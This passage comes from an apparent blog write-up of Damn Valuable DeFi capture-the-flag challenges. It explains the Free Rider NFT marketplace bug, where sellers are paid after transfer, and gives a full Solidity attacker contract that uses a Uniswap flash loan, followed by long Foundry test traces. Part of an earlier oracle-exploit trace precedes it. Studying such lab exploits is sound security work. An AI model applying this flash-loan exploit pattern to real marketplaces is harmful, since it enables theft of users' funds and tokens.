    <span class="s">│   └─ ← [Stop]</span>
    <span class="s">├─ [88512] OracleAttacker::sell()</span>
    <span class="s">│   ├─ [25464] DamnValuableNFT::approve(Exchange: [0x1240FA2A84dd9157a0e76B5Cfe98B1d52268B264], 0)</span>
    <span class="na">│   │   ├─ emit Approval(owner: OracleAttacker</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f</span><span class="pi">]</span><span class="err">,</span> <span class="na">approved: Exchange</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0x1240FA2A84dd9157a0e76B5Cfe98B1d52268B264</span><span class="pi">]</span><span class="err">,</span> <span class="na">tokenId</span><span class="pi">:</span> <span class="s">0)</span>
    <span class="s">│   │   └─ ← [Stop]</span>
    <span class="s">│   ├─ [61137] Exchange::sellOne(0)</span>
    <span class="s">│   │   ├─ [1051] DamnValuableNFT::ownerOf(0) [staticcall]</span>
    <span class="s">│   │   │   └─ ← [Return] OracleAttacker</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f</span><span class="pi">]</span>
    <span class="s">│   │   ├─ [1332] DamnValuableNFT::getApproved(0) [staticcall]</span>
    <span class="s">│   │   │   └─ ← [Return] Exchange</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0x1240FA2A84dd9157a0e76B5Cfe98B1d52268B264</span><span class="pi">]</span>
    <span class="s">│   │   ├─ [1418] DamnValuableNFT::symbol() [staticcall]</span>
    <span class="s">│   │   │   └─ ← [Return] "DVNFT"</span>
    <span class="s">│   │   ├─ [6213] TrustfulOracle::getMedianPrice("DVNFT") [staticcall]</span>
    <span class="s">│   │   │   └─ ← [Return] 999000000000000000000 [9.99e20]</span>
    <span class="s">│   │   ├─ [29511] DamnValuableNFT::transferFrom(OracleAttacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], Exchange</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0x1240FA2A84dd9157a0e76B5Cfe98B1d52268B264</span><span class="pi">]</span><span class="err">,</span> <span class="s">0)</span>
    <span class="na">│   │   │   ├─ emit Transfer(from: OracleAttacker</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f</span><span class="pi">]</span><span class="err">,</span> <span class="na">to: Exchange</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0x1240FA2A84dd9157a0e76B5Cfe98B1d52268B264</span><span class="pi">]</span><span class="err">,</span> <span class="na">tokenId</span><span class="pi">:</span> <span class="s">0)</span>
    <span class="s">│   │   │   └─ ← [Stop]</span>
    <span class="s">│   │   ├─ [4162] DamnValuableNFT::burn(0)</span>
    <span class="na">│   │   │   ├─ emit Transfer(from: Exchange</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0x1240FA2A84dd9157a0e76B5Cfe98B1d52268B264</span><span class="pi">]</span><span class="err">,</span> <span class="na">to</span><span class="pi">:</span> <span class="s">0x0000000000000000000000000000000000000000, tokenId</span><span class="err">:</span> <span class="s">0)</span>
    <span class="s">│   │   │   └─ ← [Stop]</span>
    <span class="s">│   │   ├─ [55] OracleAttacker::receive{value: 999000000000000000000}()</span>
    <span class="s">│   │   │   └─ ← [Stop]</span>
    <span class="na">│   │   ├─ emit TokenSold(seller: OracleAttacker</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f</span><span class="pi">]</span><span class="err">,</span> <span class="na">tokenId</span><span class="pi">:</span> <span class="s">0, price</span><span class="err">:</span> <span class="s">999000000000000000000 [9.99e20])</span>
    <span class="s">│   │   └─ ← [Stop]</span>
    <span class="s">│   └─ ← [Stop]</span>
    <span class="s">├─ [34939] OracleAttacker::recovery(999000000000000000000 [9.99e20])</span>
    <span class="s">│   ├─ [0] recovery::fallback{value: 999000000000000000000}()</span>
    <span class="s">│   │   └─ ← [Stop]</span>
    <span class="s">│   └─ ← [Stop]</span>
    <span class="s">├─ [0] VM::assertEq(0, 0) [staticcall]</span>
    <span class="s">│   └─ ← [Return]</span>
    <span class="s">├─ [0] VM::assertEq(999000000000000000000 [9.99e20], 999000000000000000000 [9.99e20]) [staticcall]</span>
    <span class="s">│   └─ ← [Return]</span>
    <span class="s">├─ [2954] DamnValuableNFT::balanceOf(player: [0x44E97aF4418b7a17AABD8090bEA0A471a366305C]) [staticcall]</span>
    <span class="s">│   └─ ← [Return] </span><span class="m">0</span>
    <span class="s">├─ [0] VM::assertEq(0, 0) [staticcall]</span>
    <span class="s">│   └─ ← [Return]</span>
    <span class="s">├─ [6213] TrustfulOracle::getMedianPrice("DVNFT") [staticcall]</span>
    <span class="s">│   └─ ← [Return] 999000000000000000000 [9.99e20]</span>
    <span class="s">├─ [0] VM::assertEq(999000000000000000000 [9.99e20], 999000000000000000000 [9.99e20]) [staticcall]</span>
    <span class="s">│   └─ ← [Return]</span>
    <span class="s">└─ ← [Stop]</span>

<span class="na">Suite result</span><span class="pi">:</span> <span class="s">ok. 1 passed; 0 failed; 0 skipped; finished in 5.35ms (1.85ms CPU time)</span>

<span class="na">Ran 1 test suite in 27.58ms (5.35ms CPU time)</span><span class="pi">:</span> <span class="s">1 tests passed, 0 failed, 0 skipped (1 total tests)</span>
</code></pre></div></div>

<hr />

<h2 id="free-rider-challenge">Free Rider Challenge:</h2>

<h2 id="challenge-overview-2">Challenge Overview:</h2>
<p>A new marketplace of Damn Valuable NFTs has been released! There’s been an initial mint of 6 NFTs, which are available for sale in the marketplace. Each one at 15 ETH.</p>

<p>A critical vulnerability has been reported, claiming that all tokens can be taken. Yet the developers don’t know how to save them!</p>

<p>They’re offering a bounty of 45 ETH for whoever is willing to take the NFTs out and send them their way. The recovery process is managed by a dedicated smart contract.</p>

<p>You’ve agreed to help. Although, you only have 0.1 ETH in balance. The devs just won’t reply to your messages asking for more.</p>

<p>If only you could get free ETH, at least for an instant.</p>

<p><strong>Simply</strong>:
In this challenge, the player is given only 15 ETH and needs to rescue 6 NFTs from a vulnerable marketplace where each NFT is priced at 15 ETH. This seems impossible at first glance, as buying all NFTs would cost 90 ETH. However, by using a flash loan and exploiting a critical vulnerability in the marketplace contract, the attacker can obtain all NFTs and send them to a recovery contract in a single transaction.</p>

<h2 id="understanding-onerc721received-in-erc-721-token-transfers">Understanding onERC721Received in ERC-721 Token Transfers:</h2>

<p><strong>What I Learned</strong>:</p>

<p>I encountered this function in a smart contract security challenge. It is used to safely receive ERC-721 NFTs and contains several security checks and logic that executes once all required NFTs are received.</p>

<h4 id="keyfunction">KeyFunction:</h4>
<pre><code class="language-solidity">//this used for this challenge
function onERC721Received(
    address,
    address,
    uint256 _tokenId,
    bytes memory _data
) external override nonReentrant returns (bytes4) {
    if (msg.sender != address(nft)) {
        revert CallerNotNFT();
    }

    if (tx.origin != beneficiary) {
        revert OriginNotBeneficiary();
    }

    if (_tokenId &gt; 5) {
        revert InvalidTokenID(_tokenId);
    }

    if (nft.ownerOf(_tokenId) != address(this)) {
        revert StillNotOwningToken(_tokenId);
    }

    if (++received == 6) {
        address recipient = abi.decode(_data, (address));
        payable(recipient).sendValue(bounty);
    }

    return IERC721Receiver.onERC721Received.selector;
}

</code></pre>
<h4 id="what-this-function-does">What This Function Does:</h4>

<ol>
  <li>
    <p>Handles NFT Transfers: This is triggered when the contract receives an NFT using safeTransferFrom.</p>
  </li>
  <li>
    <p>Security Checks:</p>

    <blockquote>
      <p>Only the official nft contract can call this.</p>
    </blockquote>

    <blockquote>
      <p>Only the original beneficiary can initiate the transfer (via tx.origin).</p>
    </blockquote>

    <blockquote>
      <p>The token ID must be in an allowed range (≤ 5).</p>
    </blockquote>

    <blockquote>
      <p>After transfer, the contract must own the NFT (protection against transfer failures).</p>
    </blockquote>
  </li>
  <li>
    <p>Bounty Logic: When 6 NFTs are received, it decodes the _data to get the recipient address and sends the bounty.</p>
  </li>
  <li>
    <p>NonReentrant Modifier: Protects against reentrancy attacks (critical when sending ETH).</p>
  </li>
</ol>

<h4 id="why-its-important">Why It’s Important</h4>

<p>Secure NFT logic is essential when building systems that use NFTs for access, voting, or ownership.</p>

<p>This code demonstrates a safe pattern for handling onERC721Received and verifying the source, token, and sender.</p>

<h2 id="vulnerability-explanation-1">Vulnerability Explanation:</h2>
<p>The core vulnerability lies in how the <code class="language-plaintext highlighter-rouge">FreeRiderNFTMarketplace</code> handles ETH payments. When someone buys an NFT, the contract transfers the ETH payment to the <strong>current owner of the NFT</strong>, which — during the exploit — happens to be the <strong>buyer themselves</strong>. This happens because the NFT is transferred to the buyer <em>before</em> the payment is made.</p>

<p>As a result:</p>
<ul>
  <li>The buyer buys an NFT.</li>
  <li>The NFT is transferred to them.</li>
  <li>Then the contract tries to pay the “seller” (who is now the buyer).</li>
  <li>So the buyer gets refunded with their own ETH.</li>
  <li>This allows them to repeat the process and buy all NFTs without actually spending ETH.</li>
</ul>

<p>In other words, <strong>the attacker buys NFTs and immediately receives back the ETH paid</strong>, allowing them to acquire all NFTs essentially for free, using a flash loan for the initial capital.</p>

<h2 id="vulnerable-code-1">Vulnerable Code:</h2>
<pre><code class="language-solidity">
// The attacker initiates the exploit by calling the buyMany() function using a flash loan of 15 ETH.
// These 15 ETH are cycled back to the buyer due to the contract logic, allowing repeated calls to buyMany()
// without spending additional ETH. This loop continues until all NFTs are acquired.
// Once all NFTs are collected, the attacker repays the flash loan along with the fee to the Uniswap pair.
// Finally, the remaining bounty reward of 45 ETH is transferred to the attacker’s (player’s) address as profit.

function buyMany(
        uint256[] calldata tokenIds
    ) external payable nonReentrant {
        for (uint256 i = 0; i &lt; tokenIds.length; ++i) {
            unchecked {
                _buyOne(tokenIds[i]);
            }
        }
    }

   function _buyOne(uint256 tokenId) private {
        uint256 priceToPay = offers[tokenId];
        if (priceToPay == 0) {
            revert TokenNotOffered(tokenId);
        }

        if (msg.value &lt; priceToPay) {
            revert InsufficientPayment();
        }

        --offersCount;

        // transfer from seller to buyer
        DamnValuableNFT _token = token; // cache for gas savings
        _token.safeTransferFrom(_token.ownerOf(tokenId), msg.sender, tokenId); 

        // pay seller using cached token
        //@audit again eth send to the buyer(bug here)
        payable(_token.ownerOf(tokenId)).sendValue(priceToPay);

        emit NFTBought(msg.sender, tokenId, priceToPay);
    }
</code></pre>
<h2 id="exploiter-strategy">Exploiter Strategy:</h2>
<p>The attacker uses a Uniswap flash loan to temporarily borrow 15 ETH worth of WETH, unwraps it to ETH, and uses it to buy all 6 NFTs one by one. Thanks to the vulnerability, each payment is refunded back, allowing re-use of the same ETH for all NFTs.</p>

<p>Steps:</p>

<ol>
  <li>
    <p>Borrow 15 ETH worth of WETH via flash loan.</p>
  </li>
  <li>
    <p>Unwrap WETH to ETH.</p>
  </li>
  <li>
    <p>Call buyMany() on the vulnerable marketplace.</p>
  </li>
  <li>
    <p>ETH used in each buy() is refunded to attacker.</p>
  </li>
  <li>
    <p>Transfer all NFTs to the recovery contract.</p>
  </li>
  <li>
    <p>Recovery Account pays the rewards to the player(45 ether)</p>
  </li>
  <li>
    <p>Repay the flash loan + fee.</p>
  </li>
</ol>

<h3 id="exploit-code-2">Exploit Code:</h3>
<pre><code class="language-solidity">
  function test_freeRider() public checkSolvedByPlayer {
        FreeRiderAttacker rideAttack = new FreeRiderAttacker{value: 0.04 ether}(
            address(uniswapPair),
            address(marketplace),
            address(nft),
            address(recoveryManager),
            address(weth)
        );
        rideAttack.attack();
    }

//Attacker Contract

    interface IFreeRideMarket {
    function buyMany(uint256[] calldata tokenIds) external payable;
}

contract FreeRiderAttacker {
    IFreeRideMarket public market;
    IERC721 public nft;
    IWETH public weth;
    IUniswapV2Pair public uniswapPair;
    address public recoveryAccount;
    address public player;
    uint256 NFT_PRICE = 15 ether;
    uint256[] tokens = [0, 1, 2, 3, 4, 5];

    constructor(
        address _uniswapPair,
        address marketplace,
        address _nft,
        address recoveryManager,
        address _weth
    ) payable {
        market = IFreeRideMarket(marketplace);
        nft = IERC721(_nft);
        weth = IWETH(_weth);
        uniswapPair = IUniswapV2Pair(_uniswapPair);
        recoveryAccount = recoveryManager;
        player = msg.sender;
    }

    function attack() public {
        uniswapPair.swap(NFT_PRICE, 0, address(this), "0x"); //asking for flashLoan and call to the uniswapV2call
    }

    function uniswapV2Call(
        address,
        uint256, ///amount0,
        uint256, //amount1,
        bytes calldata
    ) external {
        require(msg.sender == address(uniswapPair), "Not Uniswap Pair");
        require(tx.origin == player, "Not Player");
        weth.withdraw(NFT_PRICE);
        market.buyMany{value: NFT_PRICE}(tokens); // i have only 15 ether but i can buy all the 6 nfts ,because of vulnerability in the marketplace
        bytes memory data = abi.encode(player);
        for (uint256 i = 0; i &lt; tokens.length; i++) {
            nft.safeTransferFrom(address(this), recoveryAccount, i, data);
        }

        uint256 amountTopay = NFT_PRICE + ((NFT_PRICE * 3) / 997) + 1; //0.3%fee
        weth.deposit{value: amountTopay}();
        weth.transfer(address(uniswapPair), amountTopay);

        //why this is mandatory onERC721Received ?:
        // The Uniswap V2 pair will call this function to confirm the transfer of NFTs
    }

    function onERC721Received(
        address,
        address,
        uint256,
        bytes memory
    ) external pure returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }

    receive() external payable {}
}

</code></pre>

<h3 id="proof-of-exploit-2">Proof Of Exploit:</h3>
<p><em>**using foundry tool to test the exploit **</em></p>

<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
<span class="s">Ran 1 test for test/free-rider/FreeRider.t.sol:FreeRiderChallenge</span>
<span class="pi">[</span><span class="nv">PASS</span><span class="pi">]</span> <span class="na">test_freeRider() (gas</span><span class="pi">:</span> <span class="s">1781734)</span>
<span class="na">Traces</span><span class="pi">:</span>
  <span class="pi">[</span><span class="nv">1893334</span><span class="pi">]</span> <span class="s">FreeRiderChallenge::test_freeRider()</span>
    <span class="s">├─ [0] VM::startPrank(player: [0x44E97aF4418b7a17AABD8090bEA0A471a366305C], player</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0x44E97aF4418b7a17AABD8090bEA0A471a366305C</span><span class="pi">]</span><span class="s">)</span>
    <span class="s">│   └─ ← [Return]</span>
    <span class="s">├─ [1229179] → new FreeRiderAttacker@0xce110ab5927CC46905460D930CCa0c6fB4666219</span>
    <span class="s">│   └─ ← [Return] 4681 bytes of code</span>
    <span class="s">├─ [522846] FreeRiderAttacker::attack()</span>
    <span class="s">│   ├─ [518838] 0xb86E50e24Ba2B0907f281cF6AAc8C1f390030190::swap(15000000000000000000 [1.5e19], 0, FreeRiderAttacker</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0xce110ab5927CC46905460D930CCa0c6fB4666219</span><span class="pi">]</span><span class="err">,</span> <span class="s">0x3078)</span>
    <span class="s">│   │   ├─ [30307] WETH::transfer(FreeRiderAttacker: [0xce110ab5927CC46905460D930CCa0c6fB4666219], 15000000000000000000 [1.5e19])</span>
    <span class="s">│   │   │   ├─ emit Transfer(from</span><span class="err">:</span> <span class="s">0xb86E50e24Ba2B0907f281cF6AAc8C1f390030190, to</span><span class="na">: FreeRiderAttacker</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0xce110ab5927CC46905460D930CCa0c6fB4666219</span><span class="pi">]</span><span class="err">,</span> <span class="na">amount</span><span class="pi">:</span> <span class="s">15000000000000000000 [1.5e19])</span>
    <span class="s">│   │   │   └─ ← [Return] </span><span class="kc">true</span>
    <span class="s">│   │   ├─ [456454] FreeRiderAttacker::uniswapV2Call(FreeRiderAttacker: [0xce110ab5927CC46905460D930CCa0c6fB4666219], 15000000000000000000 [1.5e19], 0, 0x3078)</span>
    <span class="s">│   │   │   ├─ [16483] WETH::withdraw(15000000000000000000 [1.5e19])</span>
    <span class="s">│   │   │   │   ├─ emit Transfer(from</span><span class="na">: FreeRiderAttacker</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0xce110ab5927CC46905460D930CCa0c6fB4666219</span><span class="pi">]</span><span class="err">,</span> <span class="na">to</span><span class="pi">:</span> <span class="s">0x0000000000000000000000000000000000000000, amount</span><span class="err">:</span> <span class="s">15000000000000000000 [1.5e19])</span>
    <span class="s">│   │   │   │   ├─ emit Withdrawal(to</span><span class="na">: FreeRiderAttacker</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0xce110ab5927CC46905460D930CCa0c6fB4666219</span><span class="pi">]</span><span class="err">,</span> <span class="na">amount</span><span class="pi">:</span> <span class="s">15000000000000000000 [1.5e19])</span>
    <span class="s">│   │   │   │   ├─ [55] FreeRiderAttacker::receive{value: 15000000000000000000}()</span>
    <span class="s">│   │   │   │   │   └─ ← [Stop]</span>
    <span class="s">│   │   │   │   └─ ← [Stop]</span>
    <span class="s">│   │   │   ├─ [234831] FreeRiderNFTMarketplace::buyMany{value: 15000000000000000000}([0, 1, 2, 3, 4, 5])</span>
    <span class="s">│   │   │   │   ├─ [3051] DamnValuableNFT::ownerOf(0) [staticcall]</span>
    <span class="s">│   │   │   │   │   └─ ← [Return] deployer</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0xaE0bDc4eEAC5E950B67C6819B118761CaAF61946</span><span class="pi">]</span>
    <span class="s">│   │   │   │   ├─ [42284] DamnValuableNFT::safeTransferFrom(deployer: [0xaE0bDc4eEAC5E950B67C6819B118761CaAF61946], FreeRiderAttacker</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0xce110ab5927CC46905460D930CCa0c6fB4666219</span><span class="pi">]</span><span class="err">,</span> <span class="s">0)</span>
    <span class="s">│   │   │   │   │   ├─ emit Transfer(from</span><span class="na">: deployer</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0xaE0bDc4eEAC5E950B67C6819B118761CaAF61946</span><span class="pi">]</span><span class="err">,</span> <span class="na">to: FreeRiderAttacker</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0xce110ab5927CC46905460D930CCa0c6fB4666219</span><span class="pi">]</span><span class="err">,</span> <span class="na">tokenId</span><span class="pi">:</span> <span class="s">0)</span>
    <span class="s">│   │   │   │   │   ├─ [1756] FreeRiderAttacker::onERC721Received(FreeRiderNFTMarketplace: [0x9101223D33eEaeA94045BB2920F00BA0F7A475Bc], deployer</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0xaE0bDc4eEAC5E950B67C6819B118761CaAF61946</span><span class="pi">]</span><span class="err">,</span> <span class="s">0, 0x)</span>
    <span class="s">│   │   │   │   │   │   └─ ← [Return] 0x150b7a02</span>
    <span class="s">│   │   │   │   │   └─ ← [Stop]</span>
    <span class="s">│   │   │   │   ├─ [1051] DamnValuableNFT::ownerOf(0) [staticcall]</span>
    <span class="s">│   │   │   │   │   └─ ← [Return] FreeRiderAttacker</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0xce110ab5927CC46905460D930CCa0c6fB4666219</span><span class="pi">]</span>
    <span class="s">│   │   │   │   ├─ [55] FreeRiderAttacker::receive{value: 15000000000000000000}()</span>
    <span class="s">│   │   │   │   │   └─ ← [Stop]</span>
    <span class="na">│   │   │   │   ├─ emit NFTBought(buyer: FreeRiderAttacker</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0xce110ab5927CC46905460D930CCa0c6fB4666219</span><span class="pi">]</span><span class="err">,</span> <span class="na">tokenId</span><span class="pi">:</span> <span class="s">0, price</span><span class="err">:</span> <span class="s">15000000000000000000 [1.5e19])</span>
    <span class="s">│   │   │   │   ├─ [3051] DamnValuableNFT::ownerOf(1) [staticcall]</span>
    <span class="s">│   │   │   │   │   └─ ← [Return] deployer</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0xaE0bDc4eEAC5E950B67C6819B118761CaAF61946</span><span class="pi">]</span>
    <span class="s">│   │   │   │   ├─ [13584] DamnValuableNFT::safeTransferFrom(deployer: [0xaE0bDc4eEAC5E950B67C6819B118761CaAF61946], FreeRiderAttacker</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0xce110ab5927CC46905460D930CCa0c6fB4666219</span><span class="pi">]</span><span class="err">,</span> <span class="s">1)</span>
    <span class="na">│   │   │   │   │   ├─ emit Transfer(from: deployer</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0xaE0bDc4eEAC5E950B67C6819B118761CaAF61946</span><span class="pi">]</span><span class="err">,</span> <span class="na">to: FreeRiderAttacker</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0xce110ab5927CC46905460D930CCa0c6fB4666219</span><span class="pi">]</span><span class="err">,</span> <span class="na">tokenId</span><span class="pi">:</span> <span class="s">1)</span>
    <span class="s">│   │   │   │   │   ├─ [1756] FreeRiderAttacker::onERC721Received(FreeRiderNFTMarketplace: [0x9101223D33eEaeA94045BB2920F00BA0F7A475Bc], deployer</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0xaE0bDc4eEAC5E950B67C6819B118761CaAF61946</span><span class="pi">]</span><span class="err">,</span> <span class="s">1, 0x)</span>
    <span class="s">│   │   │   │   │   │   └─ ← [Return] 0x150b7a02</span>
    <span class="s">│   │   │   │   │   └─ ← [Stop]</span>
    <span class="s">│   │   │   │   ├─ [1051] DamnValuableNFT::ownerOf(1) [staticcall]</span>
    <span class="s">│   │   │   │   │   └─ ← [Return] FreeRiderAttacker</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0xce110ab5927CC46905460D930CCa0c6fB4666219</span><span class="pi">]</span>
    <span class="s">│   │   │   │   ├─ [55] FreeRiderAttacker::receive{value: 15000000000000000000}()</span>
    <span class="s">│   │   │   │   │   └─ ← [Stop]</span>
    <span class="na">│   │   │   │   ├─ emit NFTBought(buyer: FreeRiderAttacker</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0xce110ab5927CC46905460D930CCa0c6fB4666219</span><span class="pi">]</span><span class="err">,</span> <span class="na">tokenId</span><span class="pi">:</span> <span class="s">1, price</span><span class="err">:</span> <span class="s">15000000000000000000 [1.5e19])</span>
    <span class="s">│   │   │   │   ├─ [3051] DamnValuableNFT::ownerOf(2) [staticcall]</span>
    <span class="s">│   │   │   │   │   └─ ← [Return] deployer</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0xaE0bDc4eEAC5E950B67C6819B118761CaAF61946</span><span class="pi">]</span>
    <span class="s">│   │   │   │   ├─ [13584] DamnValuableNFT::safeTransferFrom(deployer: [0xaE0bDc4eEAC5E950B67C6819B118761CaAF61946], FreeRiderAttacker</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0xce110ab5927CC46905460D930CCa0c6fB4666219</span><span class="pi">]</span><span class="err">,</span> <span class="s">2)</span>
    <span class="na">│   │   │   │   │   ├─ emit Transfer(from: deployer</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0xaE0bDc4eEAC5E950B67C6819B118761CaAF61946</span><span class="pi">]</span><span class="err">,</span> <span class="na">to: FreeRiderAttacker</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0xce110ab5927CC46905460D930CCa0c6fB4666219</span><span class="pi">]</span><span class="err">,</span> <span class="na">tokenId</span><span class="pi">:</span> <span class="s">2)</span>
    <span class="s">│   │   │   │   │   ├─ [1756] FreeRiderAttacker::onERC721Received(FreeRiderNFTMarketplace: [0x9101223D33eEaeA94045BB2920F00BA0F7A475Bc], deployer</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0xaE0bDc4eEAC5E950B67C6819B118761CaAF61946</span><span class="pi">]</span><span class="err">,</span> <span class="s">2, 0x)</span>
    <span class="s">│   │   │   │   │   │   └─ ← [Return] 0x150b7a02</span>
    <span class="s">│   │   │   │   │   └─ ← [Stop]</span>
    <span class="s">│   │   │   │   ├─ [1051] DamnValuableNFT::ownerOf(2) [staticcall]</span>
    <span class="s">│   │   │   │   │   └─ ← [Return] FreeRiderAttacker</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0xce110ab5927CC46905460D930CCa0c6fB4666219</span><span class="pi">]</span>
    <span class="s">│   │   │   │   ├─ [55] FreeRiderAttacker::receive{value: 15000000000000000000}()</span>
    <span class="s">│   │   │   │   │   └─ ← [Stop]</span>
    <span class="na">│   │   │   │   ├─ emit NFTBought(buyer: FreeRiderAttacker</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0xce110ab5927CC46905460D930CCa0c6fB4666219</span><span class="pi">]</span><span class="err">,</span> <span class="na">tokenId</span><span class="pi">:</span> <span class="s">2, price</span><span class="err">:</span> <span class="s">15000000000000000000 [1.5e19])</span>
    <span class="s">│   │   │   │   ├─ [3051] DamnValuableNFT::ownerOf(3) [staticcall]</span>
    <span class="s">│   │   │   │   │   └─ ← [Return] deployer</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0xaE0bDc4eEAC5E950B67C6819B118761CaAF61946</span><span class="pi">]</span>
    <span class="s">│   │   │   │   ├─ [13584] DamnValuableNFT::safeTransferFrom(deployer: [0xaE0bDc4eEAC5E950B67C6819B118761CaAF61946], FreeRiderAttacker</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0xce110ab5927CC46905460D930CCa0c6fB4666219</span><span class="pi">]</span><span class="err">,</span> <span class="s">3)</span>
    <span class="na">│   │   │   │   │   ├─ emit Transfer(from: deployer</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0xaE0bDc4eEAC5E950B67C6819B118761CaAF61946</span><span class="pi">]</span><span class="err">,</span> <span class="na">to: FreeRiderAttacker</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0xce110ab5927CC46905460D930CCa0c6fB4666219</span><span class="pi">]</span><span class="err">,</span> <span class="na">tokenId</span><span class="pi">:</span> <span class="s">3)</span>
    <span class="s">│   │   │   │   │   ├─ [1756] FreeRiderAttacker::onERC721Received(FreeRiderNFTMarketplace: [0x9101223D33eEaeA94045BB2920F00BA0F7A475Bc], deployer</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0xaE0bDc4eEAC5E950B67C6819B118761CaAF61946</span><span class="pi">]</span><span class="err">,</span> <span class="s">3, 0x)</span>
    <span class="s">│   │   │   │   │   │   └─ ← [Return] 0x150b7a02</span>
    <span class="s">│   │   │   │   │   └─ ← [Stop]</span>
    <span class="s">│   │   │   │   ├─ [1051] DamnValuableNFT::ownerOf(3) [staticcall]</span>
    <span class="s">│   │   │   │   │   └─ ← [Return] FreeRiderAttacker</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0xce110ab5927CC46905460D930CCa0c6fB4666219</span><span class="pi">]</span>
    <span class="s">│   │   │   │   ├─ [55] FreeRiderAttacker::receive{value: 15000000000000000000}()</span>
    <span class="s">│   │   │   │   │   └─ ← [Stop]</span>
    <span class="na">│   │   │   │   ├─ emit NFTBought(buyer: FreeRiderAttacker</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0xce110ab5927CC46905460D930CCa0c6fB4666219</span><span class="pi">]</span><span class="err">,</span> <span class="na">tokenId</span><span class="pi">:</span> <span class="s">3, price</span><span class="err">:</span> <span class="s">15000000000000000000 [1.5e19])</span>
    <span class="s">│   │   │   │   ├─ [3051] DamnValuableNFT::ownerOf(4) [staticcall]</span>
    <span class="s">│   │   │   │   │   └─ ← [Return] deployer</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0xaE0bDc4eEAC5E950B67C6819B118761CaAF61946</span><span class="pi">]</span>
    <span class="s">│   │   │   │   ├─ [13584] DamnValuableNFT::safeTransferFrom(deployer: [0xaE0bDc4eEAC5E950B67C6819B118761CaAF61946], FreeRiderAttacker</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0xce110ab5927CC46905460D930CCa0c6fB4666219</span><span class="pi">]</span><span class="err">,</span> <span class="s">4)</span>
    <span class="na">│   │   │   │   │   ├─ emit Transfer(from: deployer</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0xaE0bDc4eEAC5E950B67C6819B118761CaAF61946</span><span class="pi">]</span><span class="err">,</span> <span class="na">to: FreeRiderAttacker</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0xce110ab5927CC46905460D930CCa0c6fB4666219</span><span class="pi">]</span><span class="err">,</span> <span class="na">tokenId</span><span class="pi">:</span> <span class="s">4)</span>
    <span class="s">│   │   │   │   │   ├─ [1756] FreeRiderAttacker::onERC721Received(FreeRiderNFTMarketplace: [0x9101223D33eEaeA94045BB2920F00BA0F7A475Bc], deployer</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0xaE0bDc4eEAC5E950B67C6819B118761CaAF61946</span><span class="pi">]</span><span class="err">,</span> <span class="s">4, 0x)</span>
    <span class="s">│   │   │   │   │   │   └─ ← [Return] 0x150b7a02</span>
    <span class="s">│   │   │   │   │   └─ ← [Stop]</span>
    <span class="s">│   │   │   │   ├─ [1051] DamnValuableNFT::ownerOf(4) [staticcall]</span>
    <span class="s">│   │   │   │   │   └─ ← [Return] FreeRiderAttacker</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0xce110ab5927CC46905460D930CCa0c6fB4666219</span><span class="pi">]</span>
    <span class="s">│   │   │   │   ├─ [55] FreeRiderAttacker::receive{value: 15000000000000000000}()</span>
    <span class="s">│   │   │   │   │   └─ ← [Stop]</span>
    <span class="na">│   │   │   │   ├─ emit NFTBought(buyer: FreeRiderAttacker</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0xce110ab5927CC46905460D930CCa0c6fB4666219</span><span class="pi">]</span><span class="err">,</span> <span class="na">tokenId</span><span class="pi">:</span> <span class="s">4, price</span><span class="err">:</span> <span class="s">15000000000000000000 [1.5e19])</span>
    <span class="s">│   │   │   │   ├─ [3051] DamnValuableNFT::ownerOf(5) [staticcall]</span>
